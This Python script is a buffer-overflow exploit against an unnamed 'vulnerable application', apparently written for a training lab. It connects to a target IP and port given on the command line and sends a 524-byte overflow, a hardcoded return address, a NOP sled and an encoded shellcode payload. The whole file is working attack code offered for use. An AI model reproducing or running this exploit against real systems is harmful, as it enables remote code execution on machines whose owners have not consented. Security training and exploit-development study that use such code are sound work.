#!/usr/bin/env python3

import pyfiglet
import socket
import argparse

def exploit(ip, port, buffer):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            print("Sending buffer exploit...")
            s.send(bytes(buffer + "\r\n", "latin-1"))
            print("Done!")
            s.close()
    except socket.error as e:
        print(f"Could not connect to {ip}:{port}")
        print(f"Exception: {str(e)}")
        sys.exit(0)

def main():
    asciiText = "Dynamic Buffer Overflow"
    asciiArt = pyfiglet.figlet_format(asciiText, font='digital')
    print(asciiArt)
    
    parser = argparse.ArgumentParser(description="Dynamic buffer overflow for vulnerable application.")
    parser.add_argument("ip", type=str, help="IP address of target")
    parser.add_argument("port", type=int, help="Port number of target")
    args = parser.parse_args()
    
    ip = args.ip
    port = args.port
    
    offset = 524
    overflow = "A" * offset
    retn = "\xf3\x12\x17\x31"
    padding = "\x90" * 16
    payload = ("\xdb\xd7\xba\x6c\x91\x40\x75\xd9\x74\x24\xf4\x58\x31\xc9"
"\xb1\x12\x31\x50\x17\x83\xc0\x04\x03\x3c\x82\xa2\x80\x8d"
"\x7f\xd5\x88\xbe\x3c\x49\x25\x42\x4a\x8c\x09\x24\x81\xcf"
"\xf9\xf1\xa9\xef\x30\x81\x83\x76\x32\xe9\x19\x84\xda\x47"
"\x75\x94\xe2\x86\xda\x11\x03\x18\x84\x71\x95\x0b\xfa\x71"
"\x9c\x4a\x31\xf5\xcc\xe4\xa4\xd9\x83\x9c\x50\x09\x4b\x3e"
"\xc8\xdc\x70\xec\x59\x56\x97\xa0\x55\xa5\xd8")
    
    buffer = overflow + retn + padding + payload
    exploit(ip, port, buffer)

if __name__ == "__main__":
    main()